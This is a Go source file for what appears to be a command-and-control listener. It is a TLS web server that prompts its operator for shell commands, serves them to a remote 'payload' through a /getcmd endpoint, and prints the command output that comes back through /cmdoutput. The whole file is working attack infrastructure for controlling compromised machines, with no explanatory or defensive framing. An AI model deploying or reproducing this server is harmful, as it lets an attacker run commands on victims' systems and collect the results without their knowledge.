package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strings"
)

// constants
const certPath = "resources" + string(os.PathSeparator) + "server.crt"
const keyPath = "resources" + string(os.PathSeparator) + "server.key"
const host = ""
const port = 4433

// global vars
var reader = bufio.NewReader(os.Stdin)

// GetCmd handles the /getCmd endpoint and requests a
// cmd from stdin to send to the payload
func GetCmd(writer http.ResponseWriter, req *http.Request) {
	if req.Method == http.MethodGet {
		fmt.Println("[+] Got request for cmd")
		fmt.Print("[+] CMD > ")
		text, _ := reader.ReadString('\n')
		text = strings.Replace(text, "\n", "", -1)
		fmt.Fprintf(writer, text)
	}
}

// CmdOutput handles the /cmdOutput endpoint and retrieves
// the output of a cmd executed by the payload
func CmdOutput(writer http.ResponseWriter, req *http.Request) {
	if req.Method == http.MethodPost {
		body, err := ioutil.ReadAll(req.Body)
		if err != nil {
			fmt.Printf("[-] Got error:\n%s\n", err)
			return
		}
		fmt.Printf("[+] Got response:\n%s\n", body)
		fmt.Fprintf(writer, "Successfully posted output")
	}
}

func main() {
	hoststr := fmt.Sprintf("%s:%d", host, port)

	// set up the routes
	http.HandleFunc("/getcmd", GetCmd)
	http.HandleFunc("/cmdoutput", CmdOutput)
	// start the server
	fmt.Printf("[+] Server listening on (%s)\n", hoststr)
	log.Fatal(http.ListenAndServeTLS(hoststr, certPath, keyPath, nil))
}
